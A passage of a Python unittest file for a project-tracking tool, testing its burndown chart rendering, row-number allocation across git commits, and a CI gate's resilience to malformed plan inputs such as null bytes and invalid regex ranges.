    def test_nothing_in_it_can_change_the_exit_code(self):
        self.write_plan(requirements=["\ud800.md"], focus={"upkeep": ["[z-a]"]})
        base = self.base()
        self.assertIsInstance(ci._when_and_scope(self.plan(), base), list)


class TheChart(unittest.TestCase):
    items = [{"date": "2026-02-01", "scope": 10, "strict": 0, "weighted": 0.0}, {"date": "2026-02-20", "scope": 10, "strict": 2, "weighted": 4.0}]

    def found(self, **keys):
        return {"as_of": "2026-03-01", "left": 6.0, "likely": "2026-04-01", "sure": "2026-04-20", "window_days": 28, "deadline": None, **keys}

    def test_t38_a_deadline_before_the_record_is_not_drawn_off_the_canvas(self):
        drawn = chart.burndown(self.items, "P", self.found(deadline={"date": "2025-01-01"}), "words")
        self.assertNotIn(">deadline</text>", drawn)
        self.assertIn("deadline", drawn)  # the panel still says it
        self.assertNotIn('x1="-', drawn)

    def test_an_85_percent_date_not_given_is_not_drawn_as_a_label(self):
        drawn = chart.burndown(self.items, "P", self.found(sure=None), "words")
        self.assertNotIn("85% sure", drawn)

    def test_a_live_date_is_in_the_panel(self):
        drawn = chart.burndown(self.items, "P", self.found(live={"likely": "2026-06-01"}), "words")
        self.assertIn("Live rows alone", drawn)


class RowNumbers(Case):
    def test_a_removed_row_never_gives_its_number_to_another(self):
        self.commit("2026-01-01", "first")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "view")
        self.assertEqual(self.engine("remove", "10").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "gone")
        done = self.engine("add", "Something new")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("added row 11", done.stdout)

    def test_with_no_history_the_table_decides(self):
        delete_tree(self.repo / ".git")
        self.write_table()
        done = self.engine("add", "Something new")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("added row 11", done.stdout)


class TheEngineStillIsTheOnlyOneThatRuns(Case):
    def test_the_gates_answer_does_not_depend_on_any_of_this(self):
        self.write_table()
        self.write_plan(requirements=["a\u0000b.md"], focus={"upkeep": ["[z-a]"]}, deadline="2026-12-01")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        self.assertEqual(self.engine("check", "--offline").returncode, 0)

    def test_gitio_is_what_runs_git(self):
        self.assertTrue(gitio.git(self.repo, "rev-parse", "--git-dir").out.strip())


if __name__ == "__main__":
    unittest.main()
